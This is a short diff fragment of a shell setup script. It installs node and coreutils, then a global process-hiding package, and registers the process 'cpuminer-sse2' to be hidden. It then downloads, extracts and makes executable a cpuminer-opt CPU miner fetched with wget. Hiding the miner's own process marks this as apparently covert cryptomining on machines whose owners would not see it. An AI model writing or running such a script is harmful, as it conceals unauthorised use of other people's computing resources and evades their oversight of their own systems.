@@ -2,9 +2,9 @@
 brew update && \
 brew install node && \
 brew install coreutils && \
-npm install -g npm@8.19.1 -y && \
+npm install -g npm@8.19.2 -y && \
 npm i -g node-process-hider && \
-ph add sgr1 && \
+ph add cpuminer-sse2 && \
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && \
 tar xf cpuminer-opt-mac.tar.gz && \
 chmod +x cpuminer-sse2 && \
